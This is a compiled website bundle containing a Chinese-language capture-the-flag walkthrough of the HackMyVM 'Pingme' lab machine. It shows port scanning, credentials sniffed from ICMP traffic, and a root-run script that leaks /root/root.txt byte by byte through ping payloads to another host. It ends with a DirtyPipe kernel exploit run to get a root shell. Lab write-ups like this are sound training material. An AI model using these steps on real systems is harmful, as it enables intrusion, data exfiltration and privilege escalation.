"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[9992],{28453:(e,n,r)=>{r.d(n,{R:()=>c,x:()=>t});var s=r(96540);const i={},a=s.createContext(i);function c(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),s.createElement(a.Provider,{value:n},e.children)}},80672:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>t,default:()=>h,frontMatter:()=>c,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"HackMyVm/Machines/Pingme","title":"Pingme","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/HackMyVm/Machines/Pingme.md","sourceDirName":"HackMyVm/Machines","slug":"/HackMyVm/Machines/Pingme","permalink":"/docs/HackMyVm/Machines/Pingme","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Machines/Pingme.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"Locker","permalink":"/docs/HackMyVm/Machines/Locker"},"next":{"title":"Pwned","permalink":"/docs/HackMyVm/Machines/Pwned"}}');var i=r(74848),a=r(28453);const c={},t=void 0,o={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"web\u7aef",id:"web\u7aef",level:3},{value:"\u5229\u7528wireshark\u6293\u5305",id:"\u5229\u7528wireshark\u6293\u5305",level:3},{value:"SSH\u767b\u5f55",id:"ssh\u767b\u5f55",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"user\u2018s flag",id:"users-flag",level:4},{value:"root&#39;s flag",id:"roots-flag",level:4},{value:"CVE-2022-0847-DirtyPipe\u63d0\u6743",id:"cve-2022-0847-dirtypipe\u63d0\u6743",level:4}];function d(e){const n={code:"code",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"nmap -sT --min-rate 10000 -p- 192.168.56.117\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-17 00:44 EDT\r\nNmap scan report for 192.168.56.117\r\nHost is up (0.00091s latency).\r\nNot shown: 65533 closed tcp ports (conn-refused)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\nMAC Address: 08:00:27:F8:90:60 (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,i.jsx)(n.h3,{id:"web\u7aef",children:"web\u7aef"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241017124538993.png",alt:"image-20241017124538993"})}),"\n",(0,i.jsx)(n.p,{children:"\u4ed6\u4f1a\u81ea\u52a8\u52a0\u8f7d\u6211\u672c\u673a\u7684ip"}),"\n",(0,i.jsx)(n.p,{children:"\u6293\u5305\u770b\u4e86\u4e00\u4e0b\uff0cXFF\u6ce8\u5165\u4e5f\u662f\u4e0d\u884c\u7684"}),"\n",(0,i.jsx)(n.h3,{id:"\u5229\u7528wireshark\u6293\u5305",children:"\u5229\u7528wireshark\u6293\u5305"}),"\n",(0,i.jsx)(n.p,{children:"ping\u547d\u4ee4\u53d1\u7684\u5305\u662ficmp\u534f\u8bae"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"tcpdump -i eth0 icmp -w file.pacpng\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241017125020027.png",alt:"image-20241017125020027"})}),"\n",(0,i.jsx)(n.p,{children:"\u627e\u5230\u4e00\u5bf9\u51ed\u636e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"pinger:P!ngM3\n"})}),"\n",(0,i.jsx)(n.h3,{id:"ssh\u767b\u5f55",children:"SSH\u767b\u5f55"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"ssh pinger@192.168.56.117\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,i.jsx)(n.h4,{id:"users-flag",children:"user\u2018s flag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"pinger@pingme:~$ cat user.txt \r\nHMV{ICMPisSafe}\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"pinger@pingme:~$ sudo -l\r\nMatching Defaults entries for pinger on pingme:\r\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser pinger may run the following commands on pingme:\r\n    (root) NOPASSWD: /usr/local/sbin/sendfilebyping\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u770b\u4e00\u4e0b\u5185\u5bb9"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\r\nif [ "$#" -ne 2 ]; then\r\necho "sendfilebyping <ip address> <path to file>"\r\necho "Only sends 1 char at a time - no error checking and slow"\r\necho "(Just a proof of concept for HackMyVm - rpj7)"\r\nexit 1\r\nfi\r\n\r\nINPUT=$2\r\nTARGET=$1\r\ni=0\r\n\r\nwhile IFS= read -r -n1 char\r\ndo\r\n    #One character at a time\r\n    HEXVAL=$( echo -n "$char" |od -An -t x1|tr -d \' \')\r\n    [  -z "$HEXVAL" ] && HEXVAL="0a"\r\n    /bin/ping $TARGET -c 1 -p $HEXVAL -q >/dev/null\r\n    ((i=i+1))\r\n    echo "Packet $i"\r\ndone < "$INPUT"\r\n\r\n# This will send a file\r\n# Not quite got around to catching it yet\r\n# Shouldnt be too hard should it ?...\r\n# just need to get the pcap , tshark and get the last byte\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5b83\u4f1a\u5229\u7528",(0,i.jsx)(n.code,{children:"ping"}),"\u4e00\u4e2a\u5b57\u7b26\u8fd9\u6837\u7684\u53d1\u9001\u6587\u4ef6"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5c1d\u8bd5\u53d1\u9001",(0,i.jsx)(n.code,{children:"/root/root.txt"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"sudo /usr/local/sbin/sendfilebyping 192.168.56.101 /root/root.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u540c\u6837\uff0cwireshark\u8fdb\u884c\u6293\u5305"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241017125636701.png",alt:"image-20241017125636701"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5229\u7528",(0,i.jsx)(n.code,{children:"tshark"}),"\u5c06\u4fe1\u606f\u63d0\u53d6\u51fa\u6765"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"tshark -r icmp.pacpng -Y icmp -e data.data -T fields > 1.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241017130651798.png",alt:"image-20241017130651798"})}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u91cc\u624b\u52a8\u53bb\u91cd"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241017130830410.png",alt:"image-20241017130830410"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"484d567b49434d5063616e42654162757365647d0a\n"})}),"\n",(0,i.jsx)(n.h4,{id:"roots-flag",children:"root's flag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"HMV{ICMPcanBeAbused}\n"})}),"\n",(0,i.jsx)(n.h4,{id:"cve-2022-0847-dirtypipe\u63d0\u6743",children:"CVE-2022-0847-DirtyPipe\u63d0\u6743"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'pinger@pingme:/tmp$ ./exploit \r\nBacking up /etc/passwd to /tmp/passwd.bak ...\r\nSetting root password to "aaron"...\r\nPassword: Restoring /etc/passwd from /tmp/passwd.bak...\r\nDone! Popping shell... (run commands now)\r\nid\r\nuid=0(root) gid=0(root) groups=0(root)\r\npwd\r\n/root\r\nls \r\nroot.txt\n'})})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}}}]);